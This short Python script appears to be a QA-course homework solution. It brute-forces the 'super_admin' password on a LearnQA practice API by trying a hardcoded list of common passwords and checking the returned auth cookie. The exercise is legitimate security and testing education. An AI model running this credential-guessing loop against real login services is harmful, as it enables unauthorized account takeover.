import requests

url1 = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

for password in ['123456',
        '123456789',
        'qwerty',
        'password',
        '1234567',
        '12345678',
        '12345',
        'iloveyou',
        '111111',
        '123123',
        'abc123',
        'qwerty123',
        '1q2w3e4r',
        'admin',
        'qwertyuiop',
        '654321',
        '555555',
        'lovely',
        '7777777',
        'welcome',
        '888888',
        'princess',
        'dragon',
        'password1',
        '123qwe']:

        payload = {"login": "super_admin", "password": f"{password}"}
        response1 = requests.post(url1, data=payload)

        cookie_value = response1.cookies.get('auth_cookie')

        cookies = {}
        if cookie_value is not None:
            cookies.update({'auth_cookie': cookie_value})
        response2 = requests.post(url2, cookies=cookies)

        if response2.text == "You are authorized":
            print(response2.text)
            print(f"Your password: {password}")